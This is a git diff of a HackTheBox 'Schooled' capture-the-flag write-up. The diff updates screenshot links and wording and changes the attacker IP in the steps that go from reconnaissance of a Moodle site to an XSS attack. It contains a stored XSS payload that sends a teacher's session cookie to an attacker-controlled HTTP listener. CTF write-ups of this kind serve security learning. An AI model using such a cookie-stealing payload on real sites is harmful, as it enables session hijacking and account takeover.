@@ -101,13 +101,17 @@ After reconnig we get 3 ports: 22/TCP SSH, 80/TCP HTTP, 33060/tcp mysql.
 
 Let's start exploring web site.
 
-![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn1.PNG)
+https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_132255.png
 
-It's site of education programm. Finding some info about prospective usersю
+It's site of education programm. 
 
-![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn1.PNG)
+Finding some info about prospective users.
+
+https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_132333.png
 
 Also we see interesting page *schooled.htb/contact.html*. Trying to exploit CSRF, SSTI, SQL Inj. Every time we get 404 Error when trying to get a quote.
+
+https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_132433.png
 
 There isn't something interesting in the source code too.
 
@@ -146,7 +150,7 @@ http://Schooled.htb/js (Status: 301)
 ===============================================================
 ```
 
-And we get no result.
+And we get no result. There isn't any credentials in these direcories.
 
 ## ffuf
 
@@ -186,7 +190,7 @@ And we find out about the subdomain *moodle*. Add `moodle.schooled.htb` to /etc/
 
 Let's see on this web page.
 
-![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn1.PNG)
+https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_132628.png
 
 We see four available courses and form to log in.
 
@@ -195,19 +199,23 @@ We see four available courses and form to log in.
 > *Moodle* is used for blended learning, distance education, flipped classroom and other e-learning projects in schools, universities, workplaces and other sectors.
 it is used to create private websites with online courses for educators and trainers to achieve learning goals.[10][11] Moodle allows for extending and tailoring learning environments using community-sourced plugins.
 
+Let's create our account.
+
+https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_132822.png
+
 After register and login we can enroll to course Mathematics of teacher Manuel Phillips.
 
-![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn1.PNG)
+https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_132928.png
 
 In the course we see two messages
 
-![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn1.PNG)
+https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_133008.png
 
 One of messages is interesting...
 
-![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn1.PNG)
+https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-01_133038.png
 
-Ok, I think we need to start searching some CVE for *moodle*
+Ok, I think we need to start searching some CVE for *moodle*.
 
 * https://www.cybersecurity-help.cz/vdb/SB2020072004
 * https://www.cybersecurity-help.cz/vulnerabilities/31682/
@@ -225,10 +233,10 @@ We can steel cookie's teacher with XSS attack. There is the good [article](https
 Let's edit our profile and use this XSS.
 
 ```
-<script>var i=new Image;i.src="http://192.168.0.18:8888/?"+document.cookie;</script>
+<script>var i=new Image;i.src="http://10.10.14.73:8000/?"+document.cookie;</script>
 ```
 
-Start local http server and waiting cookie
+Start local http server and waiting cookie.
 
 ```
 
